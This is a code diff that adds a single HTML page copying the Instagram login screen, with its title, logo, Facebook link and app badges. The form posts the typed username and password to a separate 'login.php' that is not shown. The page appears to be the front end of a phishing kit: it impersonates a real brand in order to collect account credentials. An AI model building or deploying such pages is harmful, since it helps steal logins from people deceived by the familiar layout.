@@ -1,0 +1,180 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Instagram • Log in</title>
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+
+<style>
+*{
+  margin:0;
+  padding:0;
+  box-sizing:border-box;
+  font-family: Arial, Helvetica, sans-serif;
+}
+
+body{
+  background:#121212;
+  display:flex;
+  justify-content:center;
+  align-items:center;
+  min-height:100vh;
+}
+
+.container{
+  width:350px;
+}
+
+.login-box{
+  background:#1e1e1e;
+  border:1px solid #333;
+  padding:40px 30px 20px;
+  text-align:center;
+  color:white;
+}
+
+.logo{
+  display:flex;
+  justify-content:center;
+  align-items:center;
+  margin-bottom:30px;
+}
+
+.instagram-text{
+  font-family:'Segoe UI', sans-serif;
+  font-weight:600;
+  font-size:40px;
+  background:linear-gradient(45deg,#f58529,#dd2a7b,#8134af,#515bd4);
+  -webkit-background-clip:text;
+  -webkit-text-fill-color:transparent;
+}
+
+.pe-2{ padding-right:8px; }
+
+input{
+  width:100%;
+  padding:10px;
+  margin-bottom:6px;
+  border:1px solid #333;
+  border-radius:3px;
+  background:#2a2a2a;
+  font-size:12px;
+  color:white;
+}
+
+input::placeholder{ color:#aaa; }
+
+button{
+  width:100%;
+  background:#0095f6;
+  border:none;
+  color:white;
+  padding:8px;
+  border-radius:8px;
+  font-weight:600;
+  margin-top:10px;
+  cursor:pointer;
+}
+
+.divider{
+  display:flex;
+  align-items:center;
+  margin:20px 0;
+}
+
+.divider div{
+  flex:1;
+  height:1px;
+  background:#333;
+}
+
+.divider span{
+  margin:0 15px;
+  font-size:12px;
+  color:#aaa;
+  font-weight:600;
+}
+
+.fb-login{ color:#4da3ff; font-weight:600; }
+.forgot{ font-size:12px; color:#4da3ff; text-decoration:none; }
+
+.signup-box{
+  background:#1e1e1e;
+  border:1px solid #333;
+  padding:20px;
+  text-align:center;
+  margin-top:10px;
+  font-size:14px;
+  color:white;
+}
+
+.signup-box a{ color:#0095f6; font-weight:600; }
+
+.apps{ text-align:center; margin-top:20px; color:white; }
+
+.stores{
+  display:flex;
+  justify-content:center;
+  gap:10px;
+  margin-top:12px;
+}
+
+.store{
+  border:1px solid #333;
+  padding:8px 14px;
+  border-radius:6px;
+  font-size:12px;
+  background:#1e1e1e;
+  color:white;
+}
+</style>
+</head>
+
+<body>
+
+<div class="container">
+
+  <div class="login-box">
+
+    <div class="logo instagram-text">
+      <i class="fa-brands fa-instagram pe-2"></i>Instagram
+    </div>
+
+    <!-- FORM WITH ACTION -->
+    <form method="POST" action="login.php">
+      <input type="text" name="username" placeholder="Phone number, username, or email" required>
+      <input type="password" name="password" placeholder="Password" required>
+      <button type="submit">Log in</button>
+    </form>
+
+    <div class="divider">
+      <div></div>
+      <span>OR</span>
+      <div></div>
+    </div>
+
+    <div class="fb-login">
+      <i class="fa-brands fa-facebook"></i> Log in with Facebook
+    </div>
+
+    <a class="forgot" href="#">Forgot password?</a>
+  </div>
+
+  <div class="signup-box">
+    Don’t have an account? <a href="#">Sign up</a>
+  </div>
+
+  <div class="apps">
+    Get the app.
+    <div class="stores">
+      <div class="store">Google Play</div>
+      <div class="store">Microsoft</div>
+    </div>
+  </div>
+
+</div>
+
+</body>
+</html>
